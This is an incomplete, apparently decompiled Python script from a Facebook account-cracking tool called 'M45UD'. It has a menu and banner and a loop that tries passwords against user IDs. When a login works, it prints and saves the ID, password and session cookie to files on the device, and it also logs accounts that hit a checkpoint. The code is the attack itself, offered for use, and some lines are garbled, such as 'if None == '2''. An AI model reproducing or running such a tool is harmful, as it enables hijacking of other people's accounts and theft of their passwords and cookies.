...
def khld():
    ...
    if opt == '1':
        i()
    if None == '2':
        os.system('xdg-open https://www.facebook.com/profile.php?id=100083658345175')
        return None
    if None == '3':
...
\033[32;1m ##   ##   # #   #     # #     # #     # 
 ...
 []   \033[31;1mWHATSAPP      \033[34;1m:   \033[37;1m01300******             
...
def i():
    ...
    print('IDS SAVED IN M45UD-OK.txt, KHALID-CP.txt')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r\033[1;32m[M45UD-OK] ' +uid+ ' | ' +ps+    '  \n\033[1;35m[√]\033[1;32mCOOKIE = \033[1;34m'+coki+  ' \n\033[1;36m[√] [AGENT] = \033[1;35m'+pro+'  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/M45UD-OK.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\r\r\33[1;30m[M45UD-CP]  ' +uid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/M45UD-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r\r%s[M45UD] [%s/%s]  OK:- %s  CP:- %s '%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
